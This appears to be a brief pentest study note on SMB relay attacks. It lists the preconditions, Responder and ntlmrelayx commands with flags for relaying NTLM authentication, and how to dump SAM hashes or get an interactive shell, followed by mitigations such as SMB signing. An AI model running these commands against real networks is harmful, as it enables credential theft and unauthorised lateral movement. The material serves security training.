Instead of cracking NTLM hash, we relay to another machine to gain access
# Requirements
SMB signing is disabled (or "enabled but not required")
- Use nmap, nessus or smb-signing-check to identify vuln boxes
- Nmap script: `smb2-security-mode.nse` (port 445)
Relayed user credentials must be local admin on machine we relay to
# Attack
1. Disable SMB/HTTP in `/etc/responder/Responder.conf` to prevent responder from talking on those protocols
2. Run `python responder.py -I tun0 -rdw`
3. Setup relay `ntlmrelayx.py -tf targets.txt -smb2support`
	1. add `-i` to the end to obtain an interactive prompt after step 4
4. [[LLMNR Poisoning|LLMNR]] event occurs
5. If user is admin, relay dumps SAM hashes
# Mitigation
Similar to [[LLMNR Poisoning]] mitigations
1. Enable SMB signing
	1. Completely stops the attack, but can cause ~15% performance decrease with file transfers
2. Disable NTLM authentication
	1. Stops the attack, but NTLM is fallback is kerberos fails
3. Account tiering
	1. Limit domain admins to specific tasks (only login to srv with need for DA privs), but enforcing may be difficult
4. Local admin restriction
	1. Can prevent lateral movement, but may result in increased service tickets